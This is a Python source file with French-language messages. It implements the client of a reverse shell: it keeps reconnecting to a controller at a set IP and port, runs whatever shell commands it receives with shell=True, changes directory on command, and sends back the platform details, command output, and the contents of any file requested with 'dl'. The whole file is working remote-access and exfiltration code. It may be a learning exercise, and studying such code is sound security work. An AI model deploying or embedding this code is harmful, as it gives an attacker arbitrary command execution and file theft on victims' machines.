import socket
import time
import os
import subprocess
import platform

info_platform = platform.platform()

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"connexion au serveur {HOST_IP} sur le port {HOST_PORT}")

while True:
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : Impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("connecté au serveur")
        break


while True:
    commande_bi = s.recv(MAX_DATA_SIZE)
    if not commande_bi:
        break
    commande = commande_bi.decode()
    if commande == "exit":
        break

    if commande == "infos":
        response = platform.platform() + " " + os.getcwd() + " => "
        response = response.encode()
    else:
        commande_split = commande.split(" ")
        if len(commande_split) == 2 and commande_split[0] == "cd":
            try:
                os.chdir(commande_split[1].strip("'"))
                response = " "
            except FileNotFoundError:
                response = "chemin incorrect"
            response = response.encode()
        elif len(commande_split) == 2 and commande_split[0] == "dl":
            try:
                f = open(commande_split[1], "rb")
            except FileNotFoundError:
                response = " ".encode()
            else:
                response = f.read()
                f.close()
        else :
            resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
            response = resultat.stdout + resultat.stderr
            response = response.encode()
    
            if not response or len(response) == 0:
                response = "ok"

    header = str(len(response)).zfill(13)
    print("longueur de la réponse : ", header)
    s.sendall(header.encode())
    s.sendall(response)



s.close()